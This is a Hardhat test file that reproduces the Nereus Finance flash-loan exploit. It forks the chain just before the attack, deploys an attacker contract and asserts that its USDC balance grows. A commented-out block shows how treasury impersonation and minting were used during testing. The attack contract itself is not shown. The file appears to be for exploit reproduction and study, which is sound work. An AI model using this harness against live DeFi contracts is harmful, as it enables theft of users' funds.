import { expect } from 'chai';
import { Contract, Signer } from 'ethers';
import { ethers } from 'hardhat';
import { getAbi } from '../utils/abi';
import { forkFrom } from '../utils/fork';

describe('Nereus Finance Exploit', async () => {
  let deployer: Signer;
  let attacker: Signer;
  let attackerContract: Contract;
  let usdcContract: Contract;

  const USDC_ADDRESS = '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E';

  before(async () => {
    // One block before the attack occurred
    await forkFrom(19613452);

    // Get an attacker EOA that we can use
    [deployer, attacker] = await ethers.getSigners();

    // Deploy the attacker script
    attackerContract = await (
      await ethers.getContractFactory('NereusFlashLoanAttack', attacker)
    ).deploy();

    const usdc_abi = await getAbi('abis/USDCABI.txt');
    usdcContract = await ethers.getContractAt(usdc_abi, USDC_ADDRESS);

    // NOTE: The code below is used for testing purposes so our flash loan
    // always gets repaid when testing the unfinished exploit.
    //
    // Impersonate the reserve treasury of the contract to send ourselves tokens
    /*const impersonated = await ethers.getImpersonatedSigner(
      '0xb7887fed5e2f9dc1a66fbb65f76ba3731d82341a',
    );

    await ethers.provider.send('hardhat_setBalance', [
      '0xb7887fed5e2f9dc1a66fbb65f76ba3731d82341a',
      '0x15af1d78b58c40000',
    ]);

    await usdcContract
      .connect(impersonated)
      .configureMinter(attacker.getAddress(), ethers.utils.parseEther('100000000'));

    await usdcContract
      .connect(attacker)
      .mint(attackerContract.address, ethers.utils.parseUnits('100000000', 6));*/
  });

  it('Exploits successfully', async () => {
    // Run our exploit
    const beforeBalance = await usdcContract.balanceOf(attackerContract.address);
    console.log(`[+] USDC Balance before exploit: ${beforeBalance / 1e6}`);

    await attackerContract.exploit();

    const afterBalance = await usdcContract.balanceOf(attackerContract.address);
    console.log(`[+] USDC Balance before exploit: ${afterBalance / 1e6}`);

    expect(beforeBalance).to.be.lt(afterBalance);
  });
});
